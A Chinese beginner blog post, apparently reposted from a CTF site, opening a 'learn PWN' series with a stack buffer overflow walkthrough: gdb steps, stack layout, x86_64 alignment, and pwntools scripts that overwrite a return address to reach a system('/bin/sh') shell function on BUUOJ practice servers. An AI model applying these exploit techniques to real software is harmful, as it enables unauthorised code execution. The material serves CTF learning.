# 从零开始学PWN学01: 缘起

> 原文: https://www.ctfiot.com/250955.html
> ID: 250955

0x00 前言

 

一直以来想对二进制对窥探一二，但前几年在攻防一线，涉及的都是web层的东西，工作中二进制一直也没什么场景。最近想来，总觉得有点遗憾。在之前的职业生涯当中，也多次建立过短暂的链接，但是缘分不深终究还是被搁浅了。

最近帮朋友A PJ某个应用，使用gdb/edb进行debug，过程踩坑无数，最后frida成功Crack掉了。随后又与朋友B研究他发现的堆溢出+业务逻辑组合漏洞构造稳定RCE利用，过程也是颇有意思。

深感缘分再来，就当作休息时做个玩具给自己找点乐子。不知道是否又像之前一样再次退去，总之随缘更新该系列。

缘起缘灭，缘聚缘散，皆是因果。

b gets # gets处下断点
finish # 让gets执行完毕，并在返回其被调用处停下
AAAA # 输入AAAA

地址

内容

备注

0x7fffffffe300

0x00

rsp

0x7fffffffe301

A

输入起始位

0x7fffffffe302

A

0x7fffffffe303

A

0x7fffffffe304

A

…

…

0x7fffffffe310

0x01

rbp

0x7fffffffe318

0x7ffff7c29d90

ret

首先我们来看一下正常的函数调用对应的汇编代码框架大致如下：

call func           ; push return address → rsp -= 8

func:
    ; 建立当前函数的栈帧
    push rbp        ; 保存调用者的        rsp -= 8
    mov  rbp, rsp   ; 设置当前栈帧基址

    ; ... 函数主体 ...

    ; 恢复调用者的栈帧
    mov  rsp, rbp   ; 丢弃当前栈帧中的局部变量区
    pop  rbp        ; 恢复调用者的        rsp += 8
    ret             ; 弹出返回地址并跳转   rsp += 8

所以我们可以发现只要刚开始栈顶地址是对齐的，调用完函数都是对齐的。

现在我们再回到，这道题的场景。在main方法ret后，栈顶地址是对齐，但是我们覆盖ret地址为了函数开头的push rbp，而不是call func处。这就导致与正常的函数调用相比，缺少了一次push。导致push次数为奇数了（每push一次rsp -= 8），进而栈顶地址不对齐。

所以解决的方案也很简单，少push一次或者多push一次。

本题当中，没有找到有call func的位置，所以选择跳过开头的push rbp减少一次push来达到栈顶地址对齐。

即把原来payload跳转地址0x00401186改成跳到0x00401187或0x0040118a都可以。

• x86_64 Linux 运行时栈的字节对齐[1]

• pwn system(“/bin/sh“)失败的原因_pwn movaps 对齐[2]


```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
b gets # gets处下断点
finish # 让gets执行完毕，并在返回其被调用处停下
AAAA # 输入AAAA
0xF + 8 = 23
from pwn import *

system_sh_addr = 0x00401186 # fun函数地址
offset = 23
payload = offset * b'A' + p64(system_sh_addr)
p = process("./pwn1")

p.sendlineafter(b'please input', payload)
p.interactive()
call func           ; push return address → rsp -= 8

func:
    ; 建立当前函数的栈帧
    push rbp        ; 保存调用者的        rsp -= 8
    mov  rbp, rsp   ; 设置当前栈帧基址

    ; ... 函数主体 ...

    ; 恢复调用者的栈帧
    mov  rsp, rbp   ; 丢弃当前栈帧中的局部变量区
    pop  rbp        ; 恢复调用者的        rsp += 8
    ret             ; 弹出返回地址并跳转   rsp += 8
from pwn import *

system_sh_addr = 0x00401187
offset = 23
payload = offset * b'A' + p64(system_sh_addr)
p = remote('node5.buuoj.cn',25170)
    #p.sendlineafter(b'please input', payload)
p.sendline(payload);
print('[*] send payload finish!')
p.interactive()
ssize_t read(int fd, void *buf, size_t count);
from pwn import *

system_sh_addr = 0x004011fb
offset = 40
payload = offset * b'A' + p64(system_sh_addr)
p = remote('node5.buuoj.cn',27996)
p.sendline(payload);
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748434995-wxsync-2025-05-fea26a560864ae63def9c0b406708a84.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748434998-wxsync-2025-05-e6062b0ff49f253f2de4feaaff51bc76.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435001-wxsync-2025-05-46e18d4d36e03adc3e047392c71226a1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435003-wxsync-2025-05-c8a15e49b8af63b3913c79102474f9b4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435006-wxsync-2025-05-ca34be75f5846fb25187e714b739270c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435009-wxsync-2025-05-e7e97f85506473015daff25bb586cef6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435011-wxsync-2025-05-41677469a62ccf02f0fbc90e9b4ddf22.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435013-wxsync-2025-05-77023741542615b6d199d88544630754.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435016-wxsync-2025-05-f1bf43fd412529b7899c52f40d434844.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748435019-wxsync-2025-05-b0a7d02c9fb91a8445b1340f0174f578.png)